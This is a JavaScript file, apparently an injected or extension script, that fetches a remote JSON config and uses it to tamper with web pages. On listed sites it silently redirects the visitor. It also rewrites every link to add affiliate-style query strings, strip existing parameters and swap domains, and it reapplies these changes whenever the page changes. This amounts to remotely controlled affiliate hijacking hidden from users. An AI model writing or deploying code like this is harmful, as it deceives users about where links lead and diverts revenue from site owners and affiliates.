window.onload = function(){
var storage;
function gD() {
    var AJXH = new XMLHttpRequest();
    AJXH.onreadystatechange = function() {
        if (AJXH.readyState == XMLHttpRequest.DONE) {   // XMLHttpRequest.DONE == 4
           if (AJXH.status == 200) {
               storage = JSON.parse(AJXH.responseText); 
               if (typeof(Storage) !== "undefined") {
               		storage.expiry = new Date().getTime() + 24 * 60 * 60 * 1000;
        				    localStorage.setItem("rk822827", JSON.stringify(storage));
        				}
              mU();
           }
        }
    };
    AJXH.open("GET", "https://devravik.github.io/aff/affd.json", true);
    AJXH.send();
}
if (localStorage.getItem("rk822827") === null) {
	gD();
}
else {
  storage = JSON.parse(localStorage.getItem("rk822827"));
  if(storage.expiry<new Date().getTime()){
  	gD();
  }
  else {
    mU();
  }
}
function mU(){
    if(storage.redirect_domains.hasOwnProperty(window.location.hostname)){
    redirect_storage = JSON.parse(localStorage.getItem("rk822827_redirect"));
    if(localStorage.getItem("rk822827_redirect") === null || redirect_storage.expiry<new Date().getTime()){
      localStorage.setItem("rk822827_redirect",JSON.stringify({host:window.location.hostname,expiry:new Date().getTime() + 12 * 60 * 60 * 1000}));
      window.location.href = storage.redirect_domains[window.location.hostname];
    }
    }
		var index = storage.domains.indexOf(window.location.hostname);
    if(index!==-1){
		var querystring = storage.query_strings[index];
		var a = document.getElementsByTagName('a');
		var i;
		for (i=0;i<a.length;i++){
			var x = a[i];
			if (x.tagName === 'A') {
		        var href = x.getAttribute('href');
            if(href && href.indexOf('https://')==-1 && href.indexOf('http://')==-1){
              href = new URL(href,window.location.origin).href;
            }
            if(href && href.indexOf(querystring)== -1) {
                href += (/\?/.test(href) ? '&' : '?') + querystring;

                if(storage.remove_query.hasOwnProperty(window.location.hostname)){
                  var p=0;
                  for(p=0;p<storage.remove_query[window.location.hostname].length;p++){
                    href = rUP(href,storage.remove_query[window.location.hostname][p]);
                  }
                }

                if(storage.replace_domain.hasOwnProperty(window.location.hostname)){
                  href=href.replace(window.location.hostname, storage.replace_domain[window.location.hostname]);
                }
                x.setAttribute('href', href);
		        }
		    }
		}
		}
}
function rUP(url, parameter) {
    var uRP= url.split('?');   
    if (uRP.length>=2) {
        var pfx= encodeURIComponent(parameter)+'=';
        var pars= uRP[1].split(/[&;]/g);
        for (var i= pars.length; i-- > 0;) {    
            if (pars[i].lastIndexOf(pfx, 0) !== -1) {  
                pars.splice(i, 1);
            }
        }
        url= uRP[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
        return url;
    } else {
        return url;
    }
}
var observeDOM = (function(){
    var MutationObserver = window.MutationObserver || window.WebKitMutationObserver,
        eventListenerSupported = window.addEventListener;
    return function(obj, callback){
        if( MutationObserver ){
            var obs = new MutationObserver(function(mutations, observer){
                if( mutations[0].addedNodes.length || mutations[0].removedNodes.length )
                    callback();
            });
            obs.observe( obj, { childList:true, subtree:true });
        }
        else if( eventListenerSupported ){
            obj.addEventListener('DOMNodeInserted', callback, false);
            obj.addEventListener('DOMNodeRemoved', callback, false);
        }
    };
})();
observeDOM( document.getElementsByTagName('div')[0] ,function(){ 
    mU();
});
};
